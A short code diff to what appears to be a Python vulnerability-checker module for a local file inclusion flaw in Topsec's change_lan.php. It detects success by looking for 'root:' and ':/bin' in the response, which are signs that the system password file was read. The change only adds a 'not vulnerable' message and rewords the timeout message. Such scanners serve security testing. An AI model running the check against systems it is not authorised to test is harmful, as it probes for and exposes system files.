@@ -27,9 +27,11 @@ class topsec_change_lan_filedownload_BaseVerify:
             req2 = sess.get(self.url, headers=headers, timeout=10, verify=False)
             if r"root:" in req2.text and r":/bin" in req2.text:
                 cprint("[+]存在天融信Topsec change_lan.php本地文件包含漏洞...(高危)\tpayload: "+vulnurl, "red")
+            else:
+                cprint("[-]不存在topsec_change_lan_filedownload漏洞", "white", "on_grey")
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
